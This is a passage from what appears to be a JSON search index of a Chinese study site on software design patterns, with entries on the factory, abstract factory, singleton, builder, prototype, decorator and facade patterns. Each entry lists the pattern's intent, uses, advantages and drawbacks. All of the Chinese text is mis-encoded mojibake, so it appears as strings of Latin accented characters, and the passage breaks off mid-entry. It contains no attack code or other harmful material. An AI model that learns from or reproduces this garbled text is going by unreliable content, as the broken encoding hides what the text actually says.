æ•°æ®åº“è®¿é—®ï¼Œå½“ç”¨æˆ·ä¸çŸ¥é“æœ€åç³»ç»Ÿé‡‡ç”¨å“ªä¸€ç±»æ•°æ®åº“ï¼Œä»¥åŠæ•°æ®åº“å¯èƒ½æœ‰å˜åŒ–æ—¶ã€‚ è®¾è®¡ä¸€ä¸ªè¿æ¥æœåŠ¡å™¨çš„æ¡†æ¶ï¼Œéœ€è¦ä¸‰ä¸ªåè®®ï¼Œ\u0026ldquo;POP3\u0026rdquo;ã€\u0026ldquo;IMAP\u0026rdquo;ã€\u0026ldquo;HTTP\u0026rdquo;ï¼Œå¯ä»¥æŠŠè¿™ä¸‰ä¸ªä½œä¸ºäº§å“ç±»ï¼Œå…±åŒå®ç°ä¸€ä¸ªæ¥å£ã€‚  ä¼˜ç‚¹ï¼š\n ä¸€ä¸ªè°ƒç”¨è€…æƒ³åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œåªè¦çŸ¥é“å…¶åç§°å°±å¯ä»¥äº†ã€‚ æ‰©å±•æ€§é«˜ï¼Œå¦‚æœæƒ³å¢åŠ ä¸€ä¸ªäº§å“ï¼Œåªè¦æ‰©å±•ä¸€ä¸ªå·¥å‚ç±»å°±å¯ä»¥ã€‚ å±è”½äº§å“çš„å…·ä½“å®ç°ï¼Œè°ƒç”¨è€…åªå…³å¿ƒäº§å“çš„æ¥å£ã€‚  ç¼ºç‚¹ï¼š\n æ¯æ¬¡å¢åŠ ä¸€ä¸ªäº§å“æ—¶ï¼Œéƒ½éœ€è¦å¢åŠ ä¸€ä¸ªå…·ä½“ç±»å’Œå¯¹è±¡å®ç°å·¥å‚ï¼Œä½¿å¾—ç³»ç»Ÿä¸­ç±»çš„ä¸ªæ•°æˆå€å¢åŠ ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šå¢åŠ äº†ç³»ç»Ÿçš„å¤æ‚åº¦ï¼ŒåŒæ—¶ä¹Ÿå¢åŠ äº†ç³»ç»Ÿå…·ä½“ç±»çš„ä¾èµ–ã€‚è¿™å¹¶ä¸æ˜¯ä»€ä¹ˆå¥½äº‹ã€‚  PostScript:\n æˆ‘æ„Ÿè§‰æ‰€è°“çš„å·¥å‚æ¨¡å¼ï¼Œå°±æ˜¯é‡æ–°å°è£…ä¸€å±‚æ¥å£ã€‚  ä¾‹å­ #  å·¥å‚æ¨¡å¼ä¹Ÿå°±æ˜¯\n  é¼ æ ‡å·¥å‚æ˜¯ä¸ªçˆ¶ç±»ï¼Œæœ‰ç”Ÿäº§é¼ æ ‡è¿™ä¸ªæ¥å£ã€‚\n  æˆ´å°”é¼ æ ‡å·¥å‚ï¼Œæƒ æ™®é¼ æ ‡å·¥å‚ç»§æ‰¿é¼ æ ‡å·¥å‚ï¼Œå¯ä»¥åˆ†åˆ«ç”Ÿäº§æˆ´å°”é¼ æ ‡ï¼Œæƒ æ™®é¼ æ ‡ã€‚\n  ç”Ÿäº§å“ªç§é¼ æ ‡ä¸å†ç”±å‚æ•°å†³å®šï¼Œè€Œæ˜¯åˆ›å»ºé¼ æ ‡å·¥å‚æ—¶ï¼Œç”±æˆ´å°”é¼ æ ‡å·¥å‚åˆ›å»ºã€‚åç»­ç›´æ¥è°ƒç”¨**é¼ æ ‡å·¥å‚.ç”Ÿäº§é¼ æ ‡()**å³å¯\n  "},{"id":403,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/2.%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/","title":"2.æŠ½è±¡å·¥å‚æ¨¡å¼","section":"1.åˆ›å»ºå‹æ¨¡å¼","content":"æŠ½è±¡å·¥å‚æ¨¡å¼ #  æŠ½è±¡å·¥å‚æ¨¡å¼ï¼ˆAbstract Factory Patternï¼‰æ˜¯å›´ç»•ä¸€ä¸ªè¶…çº§å·¥å‚åˆ›å»ºå…¶ä»–å·¥å‚ã€‚è¯¥è¶…çº§å·¥å‚åˆç§°ä¸ºå…¶ä»–å·¥å‚çš„å·¥å‚ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºåˆ›å»ºå‹æ¨¡å¼ï¼Œå®ƒæä¾›äº†ä¸€ç§åˆ›å»ºå¯¹è±¡çš„æœ€ä½³æ–¹å¼ã€‚\nåœ¨æŠ½è±¡å·¥å‚æ¨¡å¼ä¸­ï¼Œæ¥å£æ˜¯è´Ÿè´£åˆ›å»ºä¸€ä¸ªç›¸å…³å¯¹è±¡çš„å·¥å‚ï¼Œä¸éœ€è¦æ˜¾å¼æŒ‡å®šå®ƒä»¬çš„ç±»ã€‚æ¯ä¸ªç”Ÿæˆçš„å·¥å‚éƒ½èƒ½æŒ‰ç…§å·¥å‚æ¨¡å¼æä¾›å¯¹è±¡ã€‚\nä»‹ç» #  æ„å›¾ï¼š\n æä¾›ä¸€ä¸ªåˆ›å»ºä¸€ç³»åˆ—ç›¸å…³æˆ–ç›¸äº’ä¾èµ–å¯¹è±¡çš„æ¥å£ï¼Œè€Œæ— éœ€æŒ‡å®šå®ƒä»¬å…·ä½“çš„ç±»ã€‚  åº”ç”¨å®ä¾‹ï¼š\n QQ æ¢çš®è‚¤ï¼Œä¸€æ•´å¥—ä¸€èµ·æ¢ã€‚ ç”Ÿæˆä¸åŒæ“ä½œç³»ç»Ÿçš„ç¨‹åºã€‚  ä¼˜ç‚¹ï¼š\n å½“ä¸€ä¸ªäº§å“æ—ä¸­çš„å¤šä¸ªå¯¹è±¡è¢«è®¾è®¡æˆä¸€èµ·å·¥ä½œæ—¶ï¼Œå®ƒèƒ½ä¿è¯å®¢æˆ·ç«¯å§‹ç»ˆåªä½¿ç”¨åŒä¸€ä¸ªäº§å“æ—ä¸­çš„å¯¹è±¡ã€‚  ç¼ºç‚¹ï¼š\n äº§å“æ—æ‰©å±•éå¸¸å›°éš¾ è¦å¢åŠ ä¸€ä¸ªç³»åˆ—çš„æŸä¸€äº§å“ï¼Œæ—¢è¦åœ¨æŠ½è±¡çš„ Creator é‡ŒåŠ ä»£ç ï¼Œåˆè¦åœ¨å…·ä½“çš„é‡Œé¢åŠ ä»£ç ã€‚  PostScriptï¼š\n æˆ‘æ„Ÿè§‰æŠ½è±¡å·¥å‚æ¨¡å¼å°±æ˜¯åœ¨å·¥å‚æ¨¡å¼çš„ä¸¤å±‚ï¼ˆåº•å±‚å¯¹è±¡ä¸å¯¹å¤–æ¥å£ï¼‰ä¹‹é—´å†åŠ å…¥ä¸€å±‚ã€‚ è¿™ä¸€å±‚ç§°ä¸ºè¶…çº§å·¥å‚ï¼Œæœ€åçš„æ´¾ç”Ÿä¾èµ–å›¾ç±»ä¼¼ä¸€ä¸ªæ¼æ–—çŠ¶ã€‚  ä¾‹å­ #  æŠ½è±¡å·¥å‚æ¨¡å¼ä¹Ÿå°±æ˜¯ä¸ä»…ç”Ÿäº§é¼ æ ‡ï¼ŒåŒæ—¶ç”Ÿäº§é”®ç›˜ã€‚ä¹Ÿå°±æ˜¯ï¼š\n  PC å‚å•†æ˜¯ä¸ªçˆ¶ç±»ï¼Œæœ‰ç”Ÿäº§é¼ æ ‡ï¼Œç”Ÿäº§é”®ç›˜ä¸¤ä¸ªæ¥å£ã€‚\n  æˆ´å°”å·¥å‚ï¼Œæƒ æ™®å·¥å‚ç»§æ‰¿å®ƒï¼Œå¯ä»¥åˆ†åˆ«ç”Ÿäº§æˆ´å°”é¼ æ ‡+æˆ´å°”é”®ç›˜ï¼Œå’Œæƒ æ™®é¼ æ ‡+æƒ æ™®é”®ç›˜ã€‚\n  åˆ›å»ºå·¥å‚æ—¶ï¼Œç”±æˆ´å°”å·¥å‚åˆ›å»ºã€‚\n  åç»­**å·¥å‚.ç”Ÿäº§é¼ æ ‡()**åˆ™ç”Ÿäº§æˆ´å°”é¼ æ ‡ï¼Œ**å·¥å‚.ç”Ÿäº§é”®ç›˜()**åˆ™ç”Ÿäº§æˆ´å°”é”®ç›˜ã€‚\n  å…³äºæ‰©å±•æ€§ï¼š\n  å‡è®¾æˆ‘ä»¬å¢åŠ åç¡•å·¥å‚ï¼Œåˆ™æˆ‘ä»¬éœ€è¦å¢åŠ åç¡•å·¥å‚ï¼Œå’Œæˆ´å°”å·¥å‚ä¸€æ ·ï¼Œç»§æ‰¿ PC å‚å•†ã€‚\nä¹‹ååˆ›å»ºåç¡•é¼ æ ‡ï¼Œç»§æ‰¿é¼ æ ‡ç±»ã€‚åˆ›å»ºåç¡•é”®ç›˜ï¼Œç»§æ‰¿é”®ç›˜ç±»å³å¯ã€‚\n  å‡è®¾æˆ‘ä»¬å¢åŠ è€³éº¦è¿™ä¸ªäº§å“ï¼Œåˆ™é¦–å…ˆæˆ‘ä»¬éœ€è¦å¢åŠ è€³éº¦è¿™ä¸ªçˆ¶ç±»ï¼Œå†åŠ ä¸Šæˆ´å°”è€³éº¦ï¼Œæƒ æ™®è€³éº¦è¿™ä¸¤ä¸ªå­ç±»ã€‚\nä¹‹ååœ¨PCå‚å•†è¿™ä¸ªçˆ¶ç±»ä¸­ï¼Œå¢åŠ ç”Ÿäº§è€³éº¦çš„æ¥å£ã€‚æœ€ååœ¨æˆ´å°”å·¥å‚ï¼Œæƒ æ™®å·¥å‚è¿™ä¸¤ä¸ªç±»ä¸­ï¼Œåˆ†åˆ«å®ç°ç”Ÿäº§æˆ´å°”è€³éº¦ï¼Œæƒ æ™®è€³éº¦çš„åŠŸèƒ½ã€‚\n  "},{"id":404,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/3.%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/","title":"3.å•ä¾‹æ¨¡å¼","section":"1.åˆ›å»ºå‹æ¨¡å¼","content":"å•ä¾‹æ¨¡å¼ #  å•ä¾‹æ¨¡å¼ï¼ˆSingleton Patternï¼‰æ˜¯ Java ä¸­æœ€ç®€å•çš„è®¾è®¡æ¨¡å¼ä¹‹ä¸€ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºåˆ›å»ºå‹æ¨¡å¼ï¼Œå®ƒæä¾›äº†ä¸€ç§åˆ›å»ºå¯¹è±¡çš„æœ€ä½³æ–¹å¼ã€‚\nè¿™ç§æ¨¡å¼æ¶‰åŠåˆ°ä¸€ä¸ªå•ä¸€çš„ç±»ï¼Œè¯¥ç±»è´Ÿè´£åˆ›å»ºè‡ªå·±çš„å¯¹è±¡ï¼ŒåŒæ—¶ç¡®ä¿åªæœ‰å•ä¸ªå¯¹è±¡è¢«åˆ›å»ºã€‚è¿™ä¸ªç±»æä¾›äº†ä¸€ç§è®¿é—®å…¶å”¯ä¸€çš„å¯¹è±¡çš„æ–¹å¼ï¼Œå¯ä»¥ç›´æ¥è®¿é—®ï¼Œä¸éœ€è¦å®ä¾‹åŒ–è¯¥ç±»çš„å¯¹è±¡ã€‚\nå®ƒæœ‰ä»¥ä¸‹çš„ä¸‰ä¸ªä¸»è¦çš„ç‰¹ç‚¹ï¼š\n  å•ä¾‹ç±»åªèƒ½æœ‰ä¸€ä¸ªå®ä¾‹ã€‚\n  å•ä¾‹ç±»å¿…é¡»è‡ªå·±åˆ›å»ºè‡ªå·±çš„å”¯ä¸€å®ä¾‹ã€‚\n  å•ä¾‹ç±»å¿…é¡»ç»™æ‰€æœ‰å…¶ä»–å¯¹è±¡æä¾›è¿™ä¸€å®ä¾‹ã€‚\n  ä»‹ç» #  æ„å›¾ï¼š\n  ä¿è¯ä¸€ä¸ªç±»ä»…æœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶æä¾›ä¸€ä¸ªè®¿é—®å®ƒçš„å…¨å±€è®¿é—®ç‚¹ã€‚\n  ä¸€ä¸ªå…¨å±€ä½¿ç”¨çš„ç±»é¢‘ç¹åœ°åˆ›å»ºä¸é”€æ¯ã€å½“æ‚¨æƒ³æ§åˆ¶å®ä¾‹æ•°ç›®èŠ‚çœç³»ç»Ÿèµ„æºçš„æ—¶å€™ï¼Œä½¿ç”¨è¿™ä¸ªåˆ›å»ºæ¨¡å¼ã€‚\n  åº”ç”¨å®ä¾‹ï¼š\n  ä¸€ä¸ªç­çº§åªæœ‰ä¸€ä¸ªç­ä¸»ä»»ã€‚\n  Windows æ˜¯å¤šè¿›ç¨‹å¤šçº¿ç¨‹çš„ï¼Œåœ¨æ“ä½œä¸€ä¸ªæ–‡ä»¶çš„æ—¶å€™ï¼Œå°±ä¸å¯é¿å…åœ°å‡ºç°å¤šä¸ªè¿›ç¨‹æˆ–çº¿ç¨‹åŒæ—¶æ“ä½œä¸€ä¸ªæ–‡ä»¶çš„ç°è±¡ï¼Œæ‰€ä»¥æ‰€æœ‰æ–‡ä»¶çš„å¤„ç†å¿…é¡»é€šè¿‡å”¯ä¸€çš„å®ä¾‹æ¥è¿›è¡Œã€‚\n  ä¸€äº›è®¾å¤‡ç®¡ç†å™¨å¸¸å¸¸è®¾è®¡ä¸ºå•ä¾‹æ¨¡å¼ï¼Œæ¯”å¦‚ä¸€ä¸ªç”µè„‘æœ‰ä¸¤å°æ‰“å°æœºï¼Œåœ¨è¾“å‡ºçš„æ—¶å€™å°±è¦å¤„ç†ä¸èƒ½ä¸¤å°æ‰“å°æœºæ‰“å°åŒä¸€ä¸ªæ–‡ä»¶ã€‚\n  ä¼˜ç‚¹ï¼š\n  åœ¨å†…å­˜é‡Œåªæœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå‡å°‘äº†å†…å­˜çš„å¼€é”€ï¼Œå°¤å…¶æ˜¯é¢‘ç¹çš„åˆ›å»ºå’Œé”€æ¯å®ä¾‹ï¼ˆæ¯”å¦‚ç®¡ç†å­¦é™¢é¦–é¡µé¡µé¢ç¼“å­˜ï¼‰ã€‚\n  é¿å…å¯¹èµ„æºçš„å¤šé‡å ç”¨ï¼ˆæ¯”å¦‚å†™æ–‡ä»¶æ“ä½œï¼‰ã€‚\n  ç¼ºç‚¹ï¼š\n æ²¡æœ‰æ¥å£ï¼Œä¸èƒ½ç»§æ‰¿ï¼Œä¸å•ä¸€èŒè´£åŸåˆ™å†²çªï¼Œä¸€ä¸ªç±»åº”è¯¥åªå…³å¿ƒå†…éƒ¨é€»è¾‘ï¼Œè€Œä¸å…³å¿ƒå¤–é¢æ€ä¹ˆæ ·æ¥å®ä¾‹åŒ–ã€‚  ä½¿ç”¨åœºæ™¯ï¼š\n  è¦æ±‚ç”Ÿäº§å”¯ä¸€åºåˆ—å·ã€‚\n  WEB ä¸­çš„è®¡æ•°å™¨ï¼Œä¸ç”¨æ¯æ¬¡åˆ·æ–°éƒ½åœ¨æ•°æ®åº“é‡ŒåŠ ä¸€æ¬¡ï¼Œç”¨å•ä¾‹å…ˆç¼“å­˜èµ·æ¥ã€‚\n  åˆ›å»ºçš„ä¸€ä¸ªå¯¹è±¡éœ€è¦æ¶ˆè€—çš„èµ„æºè¿‡å¤šï¼Œæ¯”å¦‚ I/O ä¸æ•°æ®åº“çš„è¿æ¥ç­‰ã€‚\n  æ³¨æ„äº‹é¡¹ï¼š\n getInstance() æ–¹æ³•ä¸­éœ€è¦ä½¿ç”¨åŒæ­¥é” synchronized (Singleton.class) é˜²æ­¢å¤šçº¿ç¨‹åŒæ—¶è¿›å…¥é€ æˆ instance è¢«å¤šæ¬¡å®ä¾‹åŒ–ã€‚  "},{"id":405,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/4.%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/","title":"4.å»ºé€ è€…æ¨¡å¼","section":"1.åˆ›å»ºå‹æ¨¡å¼","content":"å»ºé€ è€…æ¨¡å¼ #  å»ºé€ è€…æ¨¡å¼ï¼ˆBuilder Patternï¼‰ä½¿ç”¨å¤šä¸ªç®€å•çš„å¯¹è±¡ä¸€æ­¥ä¸€æ­¥æ„å»ºæˆä¸€ä¸ªå¤æ‚çš„å¯¹è±¡ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºåˆ›å»ºå‹æ¨¡å¼ï¼Œå®ƒæä¾›äº†ä¸€ç§åˆ›å»ºå¯¹è±¡çš„æœ€ä½³æ–¹å¼ã€‚\nä¸€ä¸ª Builder ç±»ä¼šä¸€æ­¥ä¸€æ­¥æ„é€ æœ€ç»ˆçš„å¯¹è±¡ã€‚è¯¥ Builder ç±»æ˜¯ç‹¬ç«‹äºå…¶ä»–å¯¹è±¡çš„ã€‚\nä»‹ç» #  æ„å›¾ï¼š\n  å°†ä¸€ä¸ªå¤æ‚çš„æ„å»ºä¸å…¶è¡¨ç¤ºç›¸åˆ†ç¦»ï¼Œä½¿å¾—åŒæ ·çš„æ„å»ºè¿‡ç¨‹å¯ä»¥åˆ›å»ºä¸åŒçš„è¡¨ç¤ºã€‚\n  ä¸»è¦è§£å†³åœ¨è½¯ä»¶ç³»ç»Ÿä¸­ï¼Œæœ‰æ—¶å€™é¢ä¸´ç€\u0026quot;ä¸€ä¸ªå¤æ‚å¯¹è±¡\u0026quot;çš„åˆ›å»ºå·¥ä½œï¼Œå…¶é€šå¸¸ç”±å„ä¸ªéƒ¨åˆ†çš„å­å¯¹è±¡ç”¨ä¸€å®šçš„ç®—æ³•æ„æˆï¼›ç”±äºéœ€æ±‚çš„å˜åŒ–ï¼Œè¿™ä¸ªå¤æ‚å¯¹è±¡çš„å„ä¸ªéƒ¨åˆ†ç»å¸¸é¢ä¸´ç€å‰§çƒˆçš„å˜åŒ–ï¼Œä½†æ˜¯å°†å®ƒä»¬ç»„åˆåœ¨ä¸€èµ·çš„ç®—æ³•å´ç›¸å¯¹ç¨³å®šã€‚\n  åº”ç”¨å®ä¾‹ï¼š\n å»è‚¯å¾·åŸºï¼Œæ±‰å ¡ã€å¯ä¹ã€è–¯æ¡ã€ç‚¸é¸¡ç¿…ç­‰æ˜¯ä¸å˜çš„ï¼Œè€Œå…¶ç»„åˆæ˜¯ç»å¸¸å˜åŒ–çš„ï¼Œç”Ÿæˆå‡ºæ‰€è°“çš„\u0026quot;å¥—é¤\u0026quot;ã€‚ JAVA ä¸­çš„ StringBuilderã€‚  ä¼˜ç‚¹ï¼š\n å»ºé€ è€…ç‹¬ç«‹ï¼Œæ˜“æ‰©å±•ã€‚ ä¾¿äºæ§åˆ¶ç»†èŠ‚é£é™©ã€‚  ç¼ºç‚¹ï¼š\n äº§å“å¿…é¡»æœ‰å…±åŒç‚¹ï¼ŒèŒƒå›´æœ‰é™åˆ¶ã€‚ å¦‚å†…éƒ¨å˜åŒ–å¤æ‚ï¼Œä¼šæœ‰å¾ˆå¤šçš„å»ºé€ ç±»ã€‚  ä¾‹å­ #  "},{"id":406,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/5.%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/","title":"5.åŸå‹æ¨¡å¼","section":"1.åˆ›å»ºå‹æ¨¡å¼","content":"åŸå‹æ¨¡å¼ #  åŸå‹æ¨¡å¼ï¼ˆPrototype Patternï¼‰æ˜¯å®ç°äº†ä¸€ä¸ªåŸå‹æ¥å£ï¼Œè¯¥æ¥å£ç”¨äºåˆ›å»ºå½“å‰å¯¹è±¡çš„å…‹éš†ã€‚\nå½“ç›´æ¥åˆ›å»ºå¯¹è±¡çš„ä»£ä»·æ¯”è¾ƒå¤§æ—¶ï¼Œåˆ™é‡‡ç”¨è¿™ç§æ¨¡å¼ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªå¯¹è±¡éœ€è¦åœ¨ä¸€ä¸ªé«˜ä»£ä»·çš„æ•°æ®åº“æ“ä½œä¹‹åè¢«åˆ›å»ºã€‚æˆ‘ä»¬å¯ä»¥ç¼“å­˜è¯¥å¯¹è±¡ï¼Œåœ¨ä¸‹ä¸€ä¸ªè¯·æ±‚æ—¶è¿”å›å®ƒçš„å…‹éš†ï¼Œåœ¨éœ€è¦çš„æ—¶å€™æ›´æ–°æ•°æ®åº“ï¼Œä»¥æ­¤æ¥å‡å°‘æ•°æ®åº“è°ƒç”¨ã€‚\nä»‹ç» #  æ„å›¾ï¼š\n ç”¨åŸå‹å®ä¾‹æŒ‡å®šåˆ›å»ºå¯¹è±¡çš„ç§ç±»ï¼Œå¹¶ä¸”é€šè¿‡æ‹·è´è¿™äº›åŸå‹åˆ›å»ºæ–°çš„å¯¹è±¡ã€‚ å®ƒæœ‰ä»¥ä¸‹çš„å‡ ä¸ªä½¿ç”¨åœºæ™¯ï¼š  å½“ä¸€ä¸ªç³»ç»Ÿåº”è¯¥ç‹¬ç«‹äºå®ƒçš„äº§å“åˆ›å»ºï¼Œæ„æˆå’Œè¡¨ç¤ºæ—¶ã€‚ å½“è¦å®ä¾‹åŒ–çš„ç±»æ˜¯åœ¨è¿è¡Œæ—¶åˆ»æŒ‡å®šæ—¶ï¼Œä¾‹å¦‚ï¼Œé€šè¿‡åŠ¨æ€è£…è½½ã€‚ ä¸ºäº†é¿å…åˆ›å»ºä¸€ä¸ªä¸äº§å“ç±»å±‚æ¬¡å¹³è¡Œçš„å·¥å‚ç±»å±‚æ¬¡æ—¶ã€‚ å½“ä¸€ä¸ªç±»çš„å®ä¾‹åªèƒ½æœ‰å‡ ä¸ªä¸åŒçŠ¶æ€ç»„åˆä¸­çš„ä¸€ç§æ—¶ã€‚å»ºç«‹ç›¸åº”æ•°ç›®çš„åŸå‹å¹¶å…‹éš†å®ƒä»¬å¯èƒ½æ¯”æ¯æ¬¡ç”¨åˆé€‚çš„çŠ¶æ€æ‰‹å·¥å®ä¾‹åŒ–è¯¥ç±»æ›´æ–¹ä¾¿ä¸€äº›ã€‚    ä¼˜ç‚¹ï¼š\n æ€§èƒ½æé«˜ã€‚ é€ƒé¿æ„é€ å‡½æ•°çš„çº¦æŸã€‚  ç¼ºç‚¹ï¼š\n é…å¤‡å…‹éš†æ–¹æ³•éœ€è¦å¯¹ç±»çš„åŠŸèƒ½è¿›è¡Œé€šç›˜è€ƒè™‘ï¼Œè¿™å¯¹äºå…¨æ–°çš„ç±»ä¸æ˜¯å¾ˆéš¾ï¼Œä½†å¯¹äºå·²æœ‰çš„ç±»ä¸ä¸€å®šå¾ˆå®¹æ˜“ï¼Œç‰¹åˆ«å½“ä¸€ä¸ªç±»å¼•ç”¨ä¸æ”¯æŒä¸²è¡ŒåŒ–çš„é—´æ¥å¯¹è±¡ï¼Œæˆ–è€…å¼•ç”¨å«æœ‰å¾ªç¯ç»“æ„çš„æ—¶å€™ã€‚ å¿…é¡»å®ç° Cloneable æ¥å£ã€‚  ä¾‹å­ #  æ¦‚æ‹¬åœ°è¯´ï¼Œä¸»è¦æœ‰ä»¥ä¸‹çš„ä½¿ç”¨åœºæ™¯ï¼š\n èµ„æºä¼˜åŒ–åœºæ™¯ã€‚ ç±»åˆå§‹åŒ–éœ€è¦æ¶ˆåŒ–éå¸¸å¤šçš„èµ„æºï¼Œè¿™ä¸ªèµ„æºåŒ…æ‹¬æ•°æ®ã€ç¡¬ä»¶èµ„æºç­‰ã€‚ æ€§èƒ½å’Œå®‰å…¨è¦æ±‚çš„åœºæ™¯ã€‚ é€šè¿‡ new äº§ç”Ÿä¸€ä¸ªå¯¹è±¡éœ€è¦éå¸¸ç¹ççš„æ•°æ®å‡†å¤‡æˆ–è®¿é—®æƒé™ï¼Œåˆ™å¯ä»¥ä½¿ç”¨åŸå‹æ¨¡å¼ã€‚ ä¸€ä¸ªå¯¹è±¡å¤šä¸ªä¿®æ”¹è€…çš„åœºæ™¯ã€‚ ä¸€ä¸ªå¯¹è±¡éœ€è¦æä¾›ç»™å…¶ä»–å¯¹è±¡è®¿é—®ï¼Œè€Œä¸”å„ä¸ªè°ƒç”¨è€…å¯èƒ½éƒ½éœ€è¦ä¿®æ”¹å…¶å€¼æ—¶ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨åŸå‹æ¨¡å¼æ‹·è´å¤šä¸ªå¯¹è±¡ä¾›è°ƒç”¨è€…ä½¿ç”¨ã€‚ åœ¨å®é™…é¡¹ç›®ä¸­ï¼ŒåŸå‹æ¨¡å¼å¾ˆå°‘å•ç‹¬å‡ºç°ï¼Œä¸€èˆ¬æ˜¯å’Œå·¥å‚æ–¹æ³•æ¨¡å¼ä¸€èµ·å‡ºç°ï¼Œé€šè¿‡ clone çš„æ–¹æ³•åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åç”±å·¥å‚æ–¹æ³•æä¾›ç»™è°ƒç”¨è€…ã€‚åŸå‹æ¨¡å¼å·²ç»ä¸ Java èä¸ºæµ‘ç„¶ä¸€ä½“ï¼Œå¤§å®¶å¯ä»¥éšæ‰‹æ‹¿æ¥ä½¿ç”¨ã€‚  "},{"id":407,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/10.%E8%A3%85%E9%A5%B0%E5%99%A8%E6%A8%A1%E5%BC%8F/","title":"10.è£…é¥°å™¨æ¨¡å¼","section":"2.ç»“æ„å‹æ¨¡å¼","content":"è£…é¥°å™¨æ¨¡å¼ #  è£…é¥°å™¨æ¨¡å¼ï¼ˆDecorator Patternï¼‰å…è®¸å‘ä¸€ä¸ªç°æœ‰çš„å¯¹è±¡æ·»åŠ æ–°çš„åŠŸèƒ½ï¼ŒåŒæ—¶åˆä¸æ”¹å˜å…¶ç»“æ„ã€‚\nè¿™ç§æ¨¡å¼åˆ›å»ºäº†ä¸€ä¸ªè£…é¥°ç±»ï¼Œç”¨æ¥åŒ…è£…åŸæœ‰çš„ç±»ï¼Œå¹¶åœ¨ä¿æŒç±»æ–¹æ³•ç­¾åå®Œæ•´æ€§çš„å‰æä¸‹ï¼Œæä¾›äº†é¢å¤–çš„åŠŸèƒ½ã€‚\nä»‹ç» #  æ„å›¾ï¼š\n  åŠ¨æ€åœ°ç»™ä¸€ä¸ªå¯¹è±¡æ·»åŠ ä¸€äº›é¢å¤–çš„èŒè´£ã€‚å°±å¢åŠ åŠŸèƒ½æ¥è¯´ï¼Œè£…é¥°å™¨æ¨¡å¼ç›¸æ¯”ç”Ÿæˆå­ç±»æ›´ä¸ºçµæ´»ã€‚\n  å½“æˆ‘ä»¬ä¸æƒ³å¢åŠ å¾ˆå¤šå­ç±»çš„æƒ…å†µä¸‹æ‰©å±•ç±»ï¼Œä½¿ç”¨è£…é¥°å™¨ã€‚å®ƒå°†å…·ä½“åŠŸèƒ½èŒè´£åˆ’åˆ†ï¼ŒåŒæ—¶ç»§æ‰¿è£…é¥°è€…æ¨¡å¼ã€‚\n  ä¼˜ç‚¹ï¼š\n è£…é¥°ç±»å’Œè¢«è£…é¥°ç±»å¯ä»¥ç‹¬ç«‹å‘å±•ï¼Œä¸ä¼šç›¸äº’è€¦åˆï¼Œè£…é¥°æ¨¡å¼æ˜¯ç»§æ‰¿çš„ä¸€ä¸ªæ›¿ä»£æ¨¡å¼ï¼Œè£…é¥°æ¨¡å¼å¯ä»¥åŠ¨æ€æ‰©å±•ä¸€ä¸ªå®ç°ç±»çš„åŠŸèƒ½ã€‚  ç¼ºç‚¹ï¼š\n å¤šå±‚è£…é¥°æ¯”è¾ƒå¤æ‚ã€‚  "},{"id":408,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/11.%E5%A4%96%E8%A7%82%E6%A8%A1%E5%BC%8F/","title":"11.å¤–è§‚æ¨¡å¼","section":"2.ç»“æ„å‹æ¨¡å¼","content":"å¤–è§‚æ¨¡å¼ #  å¤–è§‚æ¨¡å¼ï¼ˆFacade Patternï¼‰éšè—ç³»ç»Ÿçš„å¤æ‚æ€§ï¼Œå¹¶å‘å®¢æˆ·ç«¯æä¾›äº†ä¸€ä¸ªå®¢æˆ·ç«¯å¯ä»¥è®¿é—®ç³»ç»Ÿçš„æ¥å£ã€‚\nä»‹ç» #  æ„å›¾ï¼š\n ä¸ºå­ç³»ç»Ÿä¸­çš„ä¸€ç»„æ¥å£æä¾›ä¸€ä¸ªä¸€è‡´çš„ç•Œé¢ï¼Œå¤–è§‚æ¨¡å¼å®šä¹‰äº†ä¸€ä¸ªé«˜å±‚æ¥å£ï¼Œè¿™ä¸ªæ¥å£ä½¿å¾—è¿™ä¸€å­ç³»ç»Ÿæ›´åŠ å®¹æ˜“ä½¿ç”¨ã€‚ å½“ä½ 